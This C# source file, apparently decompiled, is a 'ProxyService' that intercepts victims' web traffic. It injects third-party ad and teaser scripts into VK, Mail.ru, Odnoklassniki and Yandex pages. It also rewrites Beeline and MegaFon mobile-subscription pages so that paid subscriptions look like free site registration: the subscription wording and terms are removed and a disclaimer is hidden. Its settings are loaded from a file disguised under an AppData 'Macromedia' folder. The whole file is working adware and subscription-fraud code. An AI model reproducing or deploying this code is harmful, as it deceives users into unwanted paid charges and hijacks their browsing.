using System;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Xml;

namespace ProxyService;

public class XmlHelper
{
	public class VkAdBlock
	{
		public bool State;

		public string BigText = "";

		public string SmallText = "";

		public string ImageLink = "";

		public string Link = "";

		public string DownText = "";
	}

	public class YaAdBlock
	{
		public bool State;

		public string Titile = "";

		public string Direct = "";

		public string Text = "";

		public string Link = "";
	}

	public static string UrlRegEx { get; set; }

	public static string MatchRegEx { get; set; }

	public static string Replace { get; set; }

	public static string Insert { get; set; }

	public static string RepCount { get; set; }

	public static string Head { get; set; }

	public static string Foot { get; set; }

	public static VkAdBlock VkAds { get; set; }

	public static YaAdBlock YaAdsRight { get; set; }

	public static YaAdBlock YaAdsTop { get; set; }

	public static bool HasURL(string aUrL)
	{
		try
		{
			return Regex.IsMatch(aUrL, UrlRegEx);
		}
		catch (Exception)
		{
		}
		return false;
	}

	public static void Load()
	{
		UrlRegEx = "";
		MatchRegEx = "";
		Replace = "";
		Insert = "";
		RepCount = "0";
		Head = "";
		Foot = "";
		VkAds = new VkAdBlock();
		YaAdsRight = new YaAdBlock();
		YaAdsTop = new YaAdBlock();
		try
		{
			TryGetXml();
		}
		catch (Exception)
		{
		}
	}

	public static string xmlfile()
	{
		if (File.Exists("D:\\debugmode.txt"))
		{
			return "D:\\Proxy1\\TestApp\\sample.txt";
		}
		return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia\\sample.txt";
	}

	public static void dbgFile(string a)
	{
		try
		{
			File.WriteAllText("D:\\1.htm", a);
		}
		catch (Exception)
		{
		}
	}

	public static int rnd(int from)
	{
		return new Random().Next(0, from);
	}

	public static bool httpIsEnvoved(HttpWebRequest req, HttpWebResponse resp)
	{
		if (resp.ContentType.Contains("text/html") && (req.Address.ToString().Contains("http://") || req.Address.ToString().Contains("https://")))
		{
			ProxyServer.dbg("NAV: " + req.Address.ToString());
		}
		string text = req.Address.ToString();
		if (resp.ContentType.Contains("text/html") && (text.Contains("http://") || text.Contains("https://")))
		{
			if (!text.Contains("vk.com") && !text.Contains("mail.ru") && !text.Contains("odnoklassniki.ru") && !text.Contains("zip-connectio.in") && !text.Contains("signup.beeline.ru") && !text.Contains("wap.megafonpro.ru") && !text.Contains("yandex.ru/yandsearch") && !text.Contains("yandex.ua/yandsearch"))
			{
				return text.Contains("support-contact.ws");
			}
			return true;
		}
		return false;
	}

	public static string ChangeContent(string str, string url)
	{
		string text = "\r\n\r\n                    <div id='DIV_DA_90338'></div>\r\n                    <script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90338&div=DIV_DA_90338'></script>";
		string text2 = "\r\n                    <script type='text/javascript'>var sid=50092,bid=2416;</script><script type='text/javascript' src='http://sochetat.net/vm.js'></script>";
		string newValue = text + " " + text2;
		string text3 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key=vk'>\r\n</script>\r\n<script>\r\n\tv=1; // тизеров по горизонтали\r\n\th=1; // тизеров по вертикали\r\n\timage_size=100; // размер тизера\r\n\ttext_position=4 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'>\r\n</script>\r\n";
		string text4 = "<div id='bn_bfb5187b1b'>загрузка...</div>\r\n            <script type='text/javascript' SRC='http://recreativ.ru/rcode.bfb5187b1b.js'></script> ";
		string text5 = "<script language='Javascript'>\r\nvar bntuniqid = 'TJqhtxV2nVSrCErN7364';\r\nvar bntuniqsid = '50092';\r\n</script>\r\n<script type='text/javascript' src='http://morenews1.net/viewt.js'></script>\r\n\r\n";
		string newValue2 = "<div id='DIV_DA_90725'></div><script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90725&div=DIV_DA_90725'></script>";
		string text6 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key='>\r\n</script>\r\n<script>\r\n\tv=1; // тизеров по горизонтали\r\n\th=2; // тизеров по вертикали\r\n\timage_size=110; // размер тизера\r\n\ttext_position=1 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'></script>";
		string[] array = new string[2]
		{
			text3 + text4,
			text3 + text5
		};
		string withs = "<div id='bn_4614cef1a1'>загрузка...</div>\r\n <script type='text/javascript' SRC='http://recreativ.ru/rcode.4614cef1a1.js'></script>";
		if (url.Contains("vk.com"))
		{
			str = str.Replace("<noscript><meta http-equiv=\"refresh\" content=\"0; URL=/badbrowser.php\"></noscript>", newValue);
			str = str.Replace("<div id=\"left_blocks\"></div>", "");
			str = str.Replace("<div id=\"left_ads\"></div>", array[rnd(array.Length)]);
			return str;
		}
		if (url.Contains("odnoklassniki.ru"))
		{
			return str.Replace("</body></html>", "</body>" + text + "</html>");
		}
		if (url.Contains("mail.ru"))
		{
			str = str.Replace("<script>splashRadar('informers');</script>", text6 + " " + text2);
			str = str.Replace("<script>splashRadar('news', 1);</script>", newValue2);
			return str;
		}
		if (url.Contains("wap.megafonpro.ru"))
		{
			string value = "Подписка ";
			string text7 = "Условиями предоставления услуги Подписки";
			int num = str.IndexOf(value);
			int num2 = str.IndexOf(text7, Math.Max(0, num));
			if (num != -1 && num2 != -1)
			{
				string oldValue = str.Substring(num, num2 - num + text7.Length);
				str = str.Replace(oldValue, "Введите полученный код с бесплатного сервисного номера");
				str = str.Replace("Введите SMS пароль", "");
			}
			return str;
		}
		if (url.Contains("signup.beeline.ru"))
		{
			str = str.Replace("Оформление подписки", "Регистрация на сайте");
			str = str.Replace("Ð¿Ð¾Ð\u00b4Ð¿Ð\u00b8Ñ\u0081ÐºÐ\u00b8", "");
			str = str.Replace("отправлена смс с кодом активации подписки", "отправлена смс с кодом подтверждения");
			str = str.Replace("input type=\"text\" name=\"\"", "input type=\"hidden\" name=\"\"");
			str = rep(str, "<td width=\"70%\">", "</td>", "");
			str = rep(str, "<td>", "</td>", "");
			str = rep(str, "<td>", "</td>", "");
			str = rep(str, "<td colspan=\"2\" align=\"center\">", "</td>", "");
			return str;
		}
		if (url.Contains("zip-connectio.in"))
		{
			string from = "<div id=\"disclaimerDetails\"";
			string tos = "</div>";
			str = rep(str, from, tos, "");
			return str;
		}
		if (url.Contains("yandex.ru/yandsearch") || url.Contains("yandex.ua/yandsearch"))
		{
			str = rep(str, "<div class=\"b-adv\"><div class=\"b-adv__head\">", "показа в месяц</div>", withs);
		}
		if (url.Contains("support-contact.ws"))
		{
			str = "<html><script>document.location='http://adobe.com'</script></html>";
		}
		return str;
	}

	private static string rep(string str, string from, string tos, string withs)
	{
		int num = str.IndexOf(from);
		int num2 = str.IndexOf(tos, Math.Max(0, num));
		if (num != -1 && num2 != -1)
		{
			string oldValue = str.Substring(num, num2 - num + tos.Length);
			str = str.Replace(oldValue, withs);
		}
		return str;
	}

	private static string _ChangeContent(string str)
	{
		int count = 0;
		new Regex(MatchRegEx);
		string text = Regex.Replace(str, MatchRegEx, delegate(Match m)
		{
			if (count < int.Parse(RepCount))
			{
				count++;
				if (string.IsNullOrEmpty(Replace))
				{
					return m.Value + Insert;
				}
				return Replace + Insert;
			}
			count++;
			return m.Value;
		});
		if (!string.IsNullOrEmpty(Head))
		{
			text = Regex.Replace(text, "</head>", "</head>\n" + Head);
		}
		if (!string.IsNullOrEmpty(Foot))
		{
			text = Regex.Replace(text, "</body>", Foot + "\n</body>");
		}
		return text;
	}

	private static void TryGetXml()
	{
		string text = "";
		text = File.ReadAllText(xmlfile());
		string s = text;
		using XmlReader xmlReader = XmlReader.Create(new StringReader(s));
		xmlReader.ReadToFollowing("UrlRegEx");
		UrlRegEx = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("MatchRegEx");
		MatchRegEx = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("Replace");
		Replace = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("Insert");
		Insert = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("RepCount");
		RepCount = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("Head");
		Head = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("Foot");
		Foot = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("Vk");
		try
		{
			VkAds = new VkAdBlock();
			xmlReader.ReadToFollowing("State");
			VkAds.State = xmlReader.ReadElementContentAsInt() == 1;
			xmlReader.ReadToFollowing("BigText");
			VkAds.BigText = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("SmallText");
			VkAds.SmallText = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("ImageLink");
			VkAds.ImageLink = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Link");
			VkAds.Link = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("DownText");
			VkAds.DownText = xmlReader.ReadElementContentAsString();
		}
		catch (Exception ex)
		{
			throw ex;
		}
		xmlReader.ReadToFollowing("Ya");
		try
		{
			YaAdsRight = new YaAdBlock();
			xmlReader.ReadToFollowing("State");
			YaAdsRight.State = xmlReader.ReadElementContentAsInt() == 1;
			xmlReader.ReadToFollowing("Titile");
			YaAdsRight.Titile = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Text");
			YaAdsRight.Text = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Direct");
			YaAdsRight.Direct = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Link");
			YaAdsRight.Link = xmlReader.ReadElementContentAsString();
		}
		catch (Exception ex2)
		{
			throw ex2;
		}
		xmlReader.ReadToFollowing("YaTop");
		try
		{
			YaAdsTop = new YaAdBlock();
			xmlReader.ReadToFollowing("State");
			YaAdsTop.State = xmlReader.ReadElementContentAsInt() == 1;
			xmlReader.ReadToFollowing("Titile");
			YaAdsTop.Titile = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Text");
			YaAdsTop.Text = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Direct");
			YaAdsTop.Direct = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Link");
			YaAdsTop.Link = xmlReader.ReadElementContentAsString();
		}
		catch (Exception ex3)
		{
			throw ex3;
		}
	}
}
